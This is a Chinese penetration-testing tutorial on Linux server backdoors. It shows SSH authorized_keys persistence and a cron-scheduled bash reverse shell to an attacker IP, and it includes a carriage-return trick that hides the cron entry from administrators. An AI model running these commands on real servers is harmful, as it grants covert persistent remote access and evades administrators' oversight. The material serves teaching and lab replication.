---
title: linux 服务器常见的留后门方式（二）
date: 2022-4-2 23:36:35
tags: [Backdoor,Linux,Kali]
categories: 
 - [Penetration Test,后门]
cover: https://res.cloudinary.com/sycamore/image/upload/v1682441841/Typera/2023/04/7e00f34b8462535fcbd72b5a18b714e9.png
---

:::primary
整理好了搭环境的文章：[LINUX后门复现环境搭建](https://blog.sycamore.top/2022/03/21/LINUX%E5%90%8E%E9%97%A8%E5%A4%8D%E7%8E%B0%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA/)
:::

攻击者在通过各种手段获得服务器的控制权之后，通常会在服务器上布置一些脚本、进程、链接，即所谓的**后门**。其目的是，方便攻击者以后对该服务器进行持久性的攻击。

其中，在linux服务器上留后门的常见技术，**本文中会提及**如下几种：
- SSH公钥免密
- crontab后门
...

## SSH公钥免密

简而言之，**SSH公钥免密**就是，将**攻击者**生成的 **ssh公钥**写到**目标服务器**的`/root/.ssh/authorized_keys`中（手动在目标机上完成注册），
然后**攻击者**就可以利用对应的**私钥**免密登录。

**实现：**
1. 使用 **Xshell** 的 工具 -> 新建用户密钥生成向导，完成**ssh公钥、私钥**的生成：![image-20230426010853712](https://res.cloudinary.com/sycamore/image/upload/v1682442537/Typera/2023/04/0c7400e842c42ccbcd324c9147cf6c24.png)
（填入密码)
<br>
2. 保存生成的公钥文件（id_rsa_2048.pub），传到**目标服务器**上，![image-20230426010925673](https://res.cloudinary.com/sycamore/image/upload/v1682442569/Typera/2023/04/8a2edc41bc3463490d0617bcbbd9acd1.png)
<br>
3. 寻找 **authorized_keys** 文件，命令`find -name authorized_keys`，
如果没有，就通过命令`touch /root/.ssh/authorized_keys`创建。
<br>
4. 命令`ssh-keygen -t rsa`开启免密登录功能，
<br>
5. 通过命令`cat 公钥路径 >> /root/.ssh/authorized_keys`把公钥写入到**authorized_keys**，完成注册
<br>
6. 修改文件权限`chmod 600 ~/.ssh/authorized_keys`
`chmod 700 ~/.ssh`
<br>



7. 攻击者使用**Xshell**生成的**私钥**和之前填写的**密码**，登录目标服务器![image-20230426010955314](https://res.cloudinary.com/sycamore/image/upload/v1682442599/Typera/2023/04/f0b36186750c7e6ae6e0cfb6e31536aa.png)![image-20230426011015095](https://res.cloudinary.com/sycamore/image/upload/v1682442619/Typera/2023/04/3707348bcf16ceccd18bb0594ff0933d.png)

## crontab后门

**Crond**服务启动后，会**定期**（默认一分钟检查一次）检查它的配置文件中，是否有要执行的任务。
如果有，就会根据**预先设定**的**定时任务规则**自动执行该任务。
crontab是用来定期执行程序的命令，
我们可以通过**crontab**命令制造定时后门：
`(crontab -l;echo '*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i')|crontab -`

**解释：**
`echo '*/60 * * * *'`：设定每60分钟执行一次；
`exec 9<>/dev/tcp/192.168.158.132/2333`：利用bash提供的功能，对`/dev/tcp/`开头的字符串进行**解析**，指定**服务器IP**为：192.168.158.132（**攻击机**IP），**端口号**为 2333，指定描述符为9，建立网络连接；
`exec 0<&9;exec 1>&9 2>&1;`：**文件描述符** 0：stdin，1：stdout，把标准输入输出**都**重定向到描述符9；
`/bin/bash --noprofile -i`：开一个Shell。
其实就是利用 Bash **反弹**一个**Shell**到指定的攻击者IP

（ubuntu默认**没开**bash的网络重定向选项，需要加上`–enable-net-redirections`重新编译bash）

**隐藏：**
但是这样的一个后门，管理员直接执行`crontab -l`就能看到我们设定的定时任务。
![image-20230426011055514](https://res.cloudinary.com/sycamore/image/upload/v1682442659/Typera/2023/04/e8f07ae16e6573488c17eeea6f3339f2.png)
这个命令其实是在读取 `/var/spool/cron/crontabs/root`文件。
所以，我们可以利用cat的一个缺陷，使用一些**转义字符**，比如 \r 回车符 \n 换行符 \f 换页符，来**隐藏**我们不想让管理员看到的命令：
`(crontab -l;printf "*/60 * * * * exec 9<> /dev/tcp/192.168.158.132/2333;exec 0<&9;exec 1>&9 2>&1;/bin/bash --noprofile -i;\rno crontab for `whoami`%100c\n")|crontab -`
![image-20230426011110789](https://res.cloudinary.com/sycamore/image/upload/v1682442674/Typera/2023/04/0af7f80743588f2bae6b80f3903e55c6.png)但是，若是使用`cat -A /var/spool/cron/crontabs/root`还是可以看到我们隐藏的东西的。
